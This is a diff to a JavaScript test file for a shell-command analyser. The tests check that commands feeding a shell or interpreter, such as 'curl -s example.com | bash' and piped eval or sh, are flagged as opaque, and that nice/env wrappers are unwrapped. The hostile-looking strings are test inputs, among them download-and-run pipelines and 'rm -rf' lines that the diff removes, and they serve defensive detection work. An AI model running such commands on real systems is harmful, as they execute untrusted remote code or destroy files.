@@ -331,15 +331,13 @@ test('heredoc and herestring bodies: $( ) inside is an effective command', () =>
 
 test('a heredoc, herestring, pipe or file feeding a shell or interpreter is opaque stdin-interpreter', () => {
   for (const t of [
-    "cat <<'EOF' | sh\nrm -rf x\nEOF",
-    'bash <<EOF\nrm -rf x\nEOF',
-    'sh <<< "rm -rf x"',
+    // T16: a literal heredoc, herestring or echo feeding a shell is re-parsed (unwrap.test.mjs)
     'curl -s example.com | bash',
     'echo x | /usr/bin/python3 -',
     'echo x | node',
     'echo x | perl',
     'echo x | ruby',
-    'echo x | zsh',
+    'cat f | zsh',
     'echo x | eval',
     'echo x | source /dev/stdin',
     'sh < script.txt',
@@ -638,7 +636,9 @@ test('PRE_STEPS unwrap a command before cd, git, ops and taint are computed', ()
     }
     return { argv: argv.slice(i), env };
   };
-  PRE_STEPS.push(nice, envStep);
+  // ahead of the built-in wrapper step: this exercises the mechanism with steps that do not mark
+  // their layer external (a real `nice cd` runs in a new process and moves nothing)
+  PRE_STEPS.unshift(nice, envStep);
   try {
     let cs = cmds('nice rm x', here);
     assert.deepEqual(cs[0].argv, ['rm', 'x']);
@@ -650,7 +650,7 @@ test('PRE_STEPS unwrap a command before cd, git, ops and taint are computed', ()
     assert.deepEqual(cs[1].argv, ['cat', UNKNOWN]);
     fs.mkdirSync(path.join(here, 'sub'), { recursive: true });
     assert.equal(cmds('nice cd sub && rm f', here).at(-1).cwd, path.join(here, 'sub'));
-    assert.equal(opaque('echo x | nice env A=1 sh').construct, 'stdin-interpreter');
+    assert.equal(opaque('curl -s example.com | nice env A=1 sh').construct, 'stdin-interpreter');
   } finally {
     PRE_STEPS.splice(PRE_STEPS.indexOf(nice), 1);
     PRE_STEPS.splice(PRE_STEPS.indexOf(envStep), 1);
